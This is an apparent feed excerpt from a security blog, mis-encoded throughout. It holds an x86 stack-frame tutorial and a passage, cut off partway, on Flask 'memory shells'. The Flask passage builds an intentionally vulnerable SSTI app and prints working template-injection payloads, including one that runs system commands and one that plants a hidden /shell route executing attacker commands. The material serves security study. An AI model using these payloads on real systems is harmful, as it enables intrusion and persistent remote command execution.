    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>çœ‹CVE-2024-2961çš„æ—¶å€™å¡åœ¨äº†éœ€è¦äºŒè¿›åˆ¶åŸºç¡€çš„éƒ¨åˆ†ï¼Œäºæ˜¯ä»è¿™é‡Œå¼€å§‹æ­£å¼æ¥è§¦ä¸€ä¸‹äºŒè¿›åˆ¶å®‰å…¨çš„å†…å®¹</p><p>å‚è€ƒåŸæ–‡ï¼š</p><p><a href="https://www.yuque.com/cyberangel/rg9gdm/gcz7x2">https://www.yuque.com/cyberangel/rg9gdm/gcz7x2</a></p><span id="more"></span><hr><p>åœ¨x86çš„è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œå†…å­˜ç©ºé—´ä¸­çš„æ ˆä¸»è¦ç”¨äº<strong>ä¿å­˜å‡½æ•°çš„å‚æ•°ï¼Œè¿”å›å€¼ï¼Œè¿”å›åœ°å€ï¼Œæœ¬åœ°å˜é‡</strong>ç­‰</p><p>ä¸€åˆ‡çš„å‡½æ•°è°ƒç”¨éƒ½è¦å°†ä¸åŒçš„æ•°æ®ã€åœ°å€å‹å…¥æˆ–è€…å¼¹å‡ºæ ˆ</p><h1 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h1><p>LIFOï¼ˆåè¿›å…ˆå‡ºï¼‰ï¼Œæ•°æ®ç»“æ„å·²ç»å­¦äº†è¿™é‡Œå°±ä¸å¤šå†™äº†</p><p>è¿™ç§å½¢å¼çš„æ•°æ®ç»“æ„æ­£å¥½æ»¡è¶³æˆ‘ä»¬è°ƒç”¨å‡½æ•°çš„æ–¹å¼: <strong>çˆ¶å‡½æ•°è°ƒç”¨å­å‡½æ•°ï¼Œçˆ¶å‡½æ•°åœ¨å‰ï¼Œå­å‡½æ•°åœ¨åï¼›è¿”å›æ—¶ï¼Œå­å‡½æ•°å…ˆè¿”å›ï¼Œçˆ¶å‡½æ•°åè¿”å›</strong></p><p>æ ˆæ”¯æŒä¸¤ç§åŸºæœ¬æ“ä½œï¼špushï¼ˆå…¥æ ˆï¼‰å’Œ popï¼ˆå‡ºæ ˆï¼Œå°†æ ˆä¸­çš„æ•°æ®å¼¹å‡ºå¹¶å­˜å‚¨åˆ°æŒ‡å®šå¯„å­˜å™¨æˆ–è€…å†…å­˜ä¸­ï¼‰</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push 0x50 ; å°†0x50çš„å‹å…¥æ ˆ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810183814570.png" alt="image-20240810183814570"></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">pop å¯„å­˜å™¨åç§° ; å°†æ ˆä¸­çš„0x50å¼¹å‡ºåˆ°æŸä¸ªå¯„å­˜å™¨ä¸­<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810183835497.png" alt="image-20240810183835497"></p><p>æ³¨æ„ï¼š</p><ul><li><p>ä¸Šé¢ä¾‹å­ä¸­<strong>æ ˆçš„ç”Ÿé•¿æ–¹å‘æ˜¯ä»é«˜åœ°å€åˆ°ä½åœ°å€</strong>çš„ï¼Œå¯¹åº”åˆ°å›¾ç‰‡ä¸­æ ˆæ˜¯å‘ä¸‹ç”Ÿé•¿çš„</p></li><li><p>popæ“ä½œåï¼Œæ ˆä¸­çš„æ•°æ®å¹¶æ²¡æœ‰è¢«æ¸…ç©ºï¼Œåªæ˜¯è¯¥æ•°æ®æˆ‘ä»¬æ— æ³•ç›´æ¥è®¿é—®ï¼ˆä½†æ˜¯ä»ç„¶å¯ä»¥è®¿é—®ï¼‰</p></li></ul><hr><h1 id="æ ˆå¸§"><a href="#æ ˆå¸§" class="headerlink" title="æ ˆå¸§"></a>æ ˆå¸§</h1><p>stack frameï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ç§æ ˆï¼Œåªæ˜¯è¿™ç§æ ˆä¸“é—¨ç”¨äº<strong>ä¿å­˜å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­çš„å„ç§ä¿¡æ¯ï¼ˆå‚æ•°ï¼Œè¿”å›åœ°å€ï¼Œæœ¬åœ°å˜é‡ç­‰ï¼‰</strong></p><p>æ ˆå¸§æœ‰<strong>æ ˆé¡¶</strong>å’Œ<strong>æ ˆåº•</strong>ä¹‹åˆ†ï¼Œå…¶ä¸­æ ˆé¡¶çš„åœ°å€æœ€ä½ï¼Œæ ˆåº•çš„åœ°å€æœ€é«˜ï¼ŒSPï¼ˆæ ˆæŒ‡é’ˆï¼‰å°±æ˜¯ä¸€ç›´æŒ‡å‘æ ˆé¡¶çš„</p><p>åœ¨ x86-32bit ä¸­ï¼Œæˆ‘ä»¬<strong>ç”¨<code>ebp</code>æŒ‡å‘æ ˆåº•ã€ç”¨<code>esp</code>æŒ‡å‘æ ˆé¡¶</strong></p><p>æ ˆå¸§ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810183742188.png" alt="image-20240810183742188"></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å°†<code>ebp</code>åˆ°<code>esp</code>ä¹‹é—´åŒºåŸŸå½“åšæ ˆå¸§</p><p>æ•´ä¸ªæ ˆç©ºé—´ä¸åªæœ‰ä¸€ä¸ªæ ˆå¸§ï¼Œæ¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ ˆå¸§</p><p>åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†è°ƒç”¨å‡½æ•°çš„å‡½æ•°ç§°ä¸ºâ€œè°ƒç”¨è€…(caller)â€ï¼Œå°†è¢«è°ƒç”¨çš„å‡½æ•°ç§°ä¸ºâ€œè¢«è°ƒç”¨è€…(callee)â€ï¼š</p><ol><li>â€œè°ƒç”¨è€…â€éœ€è¦çŸ¥é“åœ¨å“ªé‡Œè·å–â€œè¢«è°ƒç”¨è€…â€è¿”å›çš„å€¼</li><li>â€œè¢«è°ƒç”¨è€…â€éœ€è¦çŸ¥é“ä¼ å…¥çš„å‚æ•°åœ¨å“ªé‡Œ</li><li>è¿”å›çš„åœ°å€åœ¨å“ªé‡Œ</li></ol><p>åŒæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¿è¯åœ¨â€œè¢«è°ƒç”¨è€…â€è¿”å›åï¼Œ**<code>ebp</code>ï¼Œ<code>esp</code> ç­‰å¯„å­˜å™¨çš„å€¼åº”è¯¥å’Œè°ƒç”¨å‰ä¸€è‡´**ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ ˆæ¥ä¿å­˜è¿™äº›æ•°æ®ã€‚</p><hr><h1 id="å‡½æ•°è°ƒç”¨å®ä¾‹"><a href="#å‡½æ•°è°ƒç”¨å®ä¾‹" class="headerlink" title="å‡½æ•°è°ƒç”¨å®ä¾‹"></a>å‡½æ•°è°ƒç”¨å®ä¾‹</h1><h2 id="å‡½æ•°çš„è°ƒç”¨"><a href="#å‡½æ•°çš„è°ƒç”¨" class="headerlink" title="å‡½æ•°çš„è°ƒç”¨"></a>å‡½æ•°çš„è°ƒç”¨</h2><p>ç®€å•å†™ä¸€ä¸ªdemoï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">MyFunction</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨32ä½ç¯å¢ƒçš„linuxä¸‹ç¼–è¯‘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> functest ./functest.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæŠŠç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶æ‹–è¿›idaåç¼–è¯‘ï¼Œå¯ä»¥çœ‹åˆ°<code>MyFunction()</code>çš„æ±‡ç¼–ä»£ç </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_MyFunction:    push ebp            ; ä¿å­˜ebpçš„å€¼    mov  ebp, esp       ; å°†espçš„å€¼èµ‹ç»™ebpï¼Œä½¿æ–°çš„ebpæŒ‡å‘æ ˆé¡¶    sub  esp, 0x12  ; åˆ†é…é¢å¤–ç©ºé—´ç»™æœ¬åœ°å˜é‡   mov  qword ptr [ebp-4], 10  ;  å¯¹æ ˆä¸­çš„å†…å­˜è¿›è¡Œèµ‹å€¼æ“ä½œ    mov  qword ptr [ebp-8], 5  ;   å¯¹æ ˆä¸­çš„å†…å­˜è¿›è¡Œèµ‹å€¼æ“ä½œ    mov  qword ptr [ebp-12], 2  ;  å¯¹æ ˆä¸­çš„å†…å­˜è¿›è¡Œèµ‹å€¼æ“ä½œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶çš„æ ˆï¼š</p><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810185616949.png" alt="image-20240810185616949"></p><p>ä¸€å¼€å§‹ä¸¤ä¸ªæ ˆå¸§éƒ½è§†ä¸ºæ˜¯ç©ºçš„ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨è€…åšäº†ä¸¤ä»¶äº‹æƒ…ï¼š</p><ol><li>å°†è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°å‹å…¥æ ˆä¸­</li><li>å°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­</li></ol><p>è¿™ä¸¤ä»¶äº‹éƒ½æ˜¯è°ƒç”¨è€…è´Ÿè´£çš„ï¼Œå› æ­¤<strong>å‹å…¥çš„æ ˆåº”è¯¥å±äºè°ƒç”¨è€…çš„æ ˆå¸§</strong></p><p>ç„¶åçœ‹è¢«è°ƒç”¨è€…ï¼š</p><ol><li>å°†æ—§çš„ï¼ˆè°ƒç”¨è€…çš„ï¼‰ <code>ebp</code>å‹å…¥æ ˆï¼Œæ­¤æ—¶<code>esp</code>æŒ‡å‘å®ƒ</li><li>å°†<code>esp</code>çš„å€¼èµ‹ç»™<code>ebp</code>ï¼Œ<code>ebp</code>å°±æœ‰äº†æ–°çš„å€¼ï¼Œå®ƒä¹ŸæŒ‡å‘å­˜æ”¾æ—§<code>ebp</code>çš„æ ˆç©ºé—´ï¼Œè¿™æ—¶å®ƒæˆäº†æ˜¯å‡½æ•° MyFunction() æ ˆå¸§çš„æ ˆåº•</li></ol><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±ä¿å­˜äº†â€œè°ƒç”¨è€…â€å‡½æ•°çš„ ebpï¼Œå¹¶ä¸”å»ºç«‹äº†ä¸€ä¸ªæ–°çš„æ ˆå¸§</p><p>æ¥ä¸‹æ¥ï¼Œåœ¨ ebp æ›´æ–°åï¼Œæˆ‘ä»¬å…ˆåˆ†é…ä¸€å—0x12å­—èŠ‚çš„ç©ºé—´ç”¨äºå­˜æ”¾æœ¬åœ°å˜é‡ï¼Œè¿™æ­¥ä½¿ç”¨<code>sub</code>å®ç°</p><p>é€šè¿‡ä½¿ç”¨<code>mov</code>è½¬ç§»æŒ‡ä»¤é…åˆå­—èŠ‚æ•°<code>ptr [offset]</code>æˆ‘ä»¬ä¾¿å¯ä»¥ç»™ a, b å’Œ c èµ‹å€¼äº†</p><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810190928975.png" alt="image-20240810190928975"></p><hr><h2 id="å‡½æ•°çš„è¿”å›"><a href="#å‡½æ•°çš„è¿”å›" class="headerlink" title="å‡½æ•°çš„è¿”å›"></a>å‡½æ•°çš„è¿”å›</h2><p>å’Œè°ƒç”¨å‡½æ•°æ—¶ç›¸åï¼Œå½“å‡½æ•°å®Œæˆè‡ªå·±çš„ä»»åŠ¡åï¼Œå®ƒä¼šå°† esp ç§»åˆ° ebp å¤„ï¼Œç„¶åå†å¼¹å‡ºæ—§çš„ ebp çš„å€¼åˆ° ebp å¯„å­˜å™¨</p><p>è¿™æ · ebp å°±æ¢å¤åˆ°äº†å‡½æ•°è°ƒç”¨å‰çš„çŠ¶æ€äº†</p><p>demoï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">MyFunction</span><span class="token punctuation">(</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ±‡ç¼–å¤§è‡´å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_MyFunction:    push ebp    mov  ebp, esp    ...    mov esp, ebp    pop ebp    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åçš„<code>ret</code>æŒ‡ä»¤ï¼Œç›¸å½“äº<code>pop + jump</code>ï¼Œå®ƒé¦–å…ˆå°†æ•°æ®ï¼ˆè¿”å›åœ°å€ï¼‰å¼¹å‡ºæ ˆå¹¶ä¿å­˜åˆ°<code>eip</code>ä¸­ï¼Œç„¶åå¤„ç†å™¨æ ¹æ®è¿™ä¸ªåœ°å€æ— æ¡ä»¶åœ°è·³åˆ°ç›¸åº”ä½ç½®è·å–æ–°çš„æŒ‡ä»¤</p><p><img src="/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/image-20240810191735985.png" alt="image-20240810191735985"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;çœ‹CVE-2024-2961çš„æ—¶å€™å¡åœ¨äº†éœ€è¦äºŒè¿›åˆ¶åŸºç¡€çš„éƒ¨åˆ†ï¼Œäºæ˜¯ä»è¿™é‡Œå¼€å§‹æ­£å¼æ¥è§¦ä¸€ä¸‹äºŒè¿›åˆ¶å®‰å…¨çš„å†…å®¹&lt;/p&gt;
&lt;p&gt;å‚è€ƒåŸæ–‡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/cyberangel/rg9gdm/gcz7x2&quot;&gt;https://www.yuque.com/cyberangel/rg9gdm/gcz7x2&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Pwn" scheme="http://c1oudfl0w0.github.io/blog/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>Flaskå†…å­˜é©¬</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-08-09T12:53:34.000Z</published>
    <updated>2024-08-19T09:20:04.523Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¹´è½»äººå­¦çš„ç¬¬ä¸€ä¸ªå†…å­˜é©¬ï¼Œç«Ÿç„¶ä¸æ˜¯javaï¼ˆ</p><p>çœ‹å¤§ä¼™å¥½åƒå‰å‡ ä¸ªæœˆéƒ½åœ¨ç ”ç©¶è¿™ä¸ªï¼Œå­¦ä¸€ä¸‹ï¼Œé¡ºå¸¦å¤å¥ä¸€ä¸‹ï¼Œå·²ç»æ‘¸äº†ä¸¤å‘¨ğŸŸäº†</p><p>å‚è€ƒï¼š</p><p><a href="https://github.com/iceyhexman/flask_memory_shell">https://github.com/iceyhexman/flask_memory_shell</a></p><p><a href="http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://xz.aliyun.com/t/14421">https://xz.aliyun.com/t/14421</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><span id="more"></span><hr><p>å…ˆå‡†å¤‡ä¸€ä¸ªFlask SSTIæ¼æ´ç¯å¢ƒï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    person <span class="token operator">=</span> <span class="token string">'guest'</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        person <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    template <span class="token operator">=</span> <span class="token string">'&lt;h2>Hello %s!&lt;/h2>'</span> <span class="token operator">%</span> person    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="debugæ¨¡å¼ä¸‹ä¸å‡ºç½‘å›æ˜¾"><a href="#debugæ¨¡å¼ä¸‹ä¸å‡ºç½‘å›æ˜¾" class="headerlink" title="debugæ¨¡å¼ä¸‹ä¸å‡ºç½‘å›æ˜¾"></a>debugæ¨¡å¼ä¸‹ä¸å‡ºç½‘å›æ˜¾</h1><p>åœ¨debugæ¨¡å¼ä¸‹ï¼ŒæŠ¥é”™ä¼šå¸¦å‡ºè¯¦ç»†ä¿¡æ¯ï¼Œdebugæ¨¡å¼å¸¸è§çš„è€ƒç‚¹æœ‰ç®—pinç è¿›consoleæ¥å‘½ä»¤æ‰§è¡Œ</p><p>å…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨æŠ¥é”™<code>raise Exception()</code>çš„æ–¹å¼æ¥è®©æˆ‘ä»¬çš„å‘½ä»¤å›æ˜¾</p><p>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'exec'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"raise Exception(__import__('os').popen('whoami').read())"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809214712376.png" alt="image-20240809214712376"></p><hr><p>æ¥ä¸‹æ¥å…³é—­debugæ¨¡å¼ï¼Œå¼€å§‹ç ”ç©¶ğŸ</p><h1 id="ä½ç‰ˆæœ¬å†…å­˜é©¬"><a href="#ä½ç‰ˆæœ¬å†…å­˜é©¬" class="headerlink" title="ä½ç‰ˆæœ¬å†…å­˜é©¬"></a>ä½ç‰ˆæœ¬å†…å­˜é©¬</h1><p>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å› ä¸ºæ‡’å¾—æä½ç‰ˆæœ¬çš„flaskäº†ï¼Œè¿™é‡Œå¯¹payloadé‡Œçš„å…³é”®éƒ¨åˆ†ç¨å¾®åˆ†æä¸€ä¸‹å°±è¿‡äº†</p><p>åœ¨evalä¸­ï¼Œæ‰§è¡Œäº†è¿™æ ·ä¸€ä¸ªä¸œè¥¿ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">"app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span><span class="token string">'shell'</span><span class="token punctuation">,</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>top<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">,</span> <span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>"<span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'_request_ctx_stack'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œè°ƒç”¨äº†Flaskå¯¹è±¡çš„<code>add_url_rule</code>æ–¹æ³•</p><h2 id="add-url-rule"><a href="#add-url-rule" class="headerlink" title="add_url_rule"></a>add_url_rule</h2><p>åœ¨Flaskä¸­æ³¨å†Œè·¯ç”±æ˜¯ä½¿ç”¨<code>@app.route()</code>è£…é¥°å™¨æ¥å®ç°çš„ï¼Œçœ‹ä¸€ä¸‹å…¶æºç å®ç°ï¼š</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809213132894.png" alt="image-20240809213132894"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨äº†<code>add_url_rule</code>æ¥æ·»åŠ è·¯ç”±ï¼Œè¿™å‡ ä¸ªå‚æ•°çš„è¯´æ˜ï¼š</p><ul><li>ruleï¼šå‡½æ•°å¯¹åº”çš„URLè§„åˆ™ï¼Œæ»¡è¶³æ¡ä»¶å’Œ app.route() çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€æ ·ï¼Œå¿…é¡»ä»¥<code>/</code>å¼€å¤´ï¼›</li><li>endpointï¼šç«¯ç‚¹ï¼Œå³åœ¨ä½¿ç”¨ url_for() è¿›è¡Œåè½¬çš„æ—¶å€™ï¼Œè¿™é‡Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ endpoint å¯¹åº”çš„å€¼ã€‚è¿™ä¸ªå€¼ä¹Ÿå¯ä»¥ä¸æŒ‡å®šï¼Œé‚£ä¹ˆé»˜è®¤å°±ä¼šä½¿ç”¨å‡½æ•°çš„åå­—ä½œä¸º endpoint çš„å€¼ï¼›</li><li>view_funcï¼šURLå¯¹åº”çš„å‡½æ•°ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œåªéœ€å†™å‡½æ•°åå­—è€Œä¸ç”¨åŠ æ‹¬å·ï¼‰ï¼Œä¸‹é¢çš„å›¾å¯¹ç…§çš„å°±æ˜¯<code>def home()</code>ï¼›</li><li>provide_automatic_optionsï¼šæ§åˆ¶æ˜¯å¦åº”è‡ªåŠ¨æ·»åŠ é€‰é¡¹æ–¹æ³•ã€‚è¿™ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®è§†å›¾æ¥æ§åˆ¶_func.provide_automatic_options &#x3D;æ·»åŠ è§„åˆ™å‰ä¸ºFalseï¼›</li><li>optionsï¼šè¦è½¬å‘åˆ°åŸºç¡€è§„åˆ™å¯¹è±¡çš„é€‰é¡¹ã€‚Werkzeug 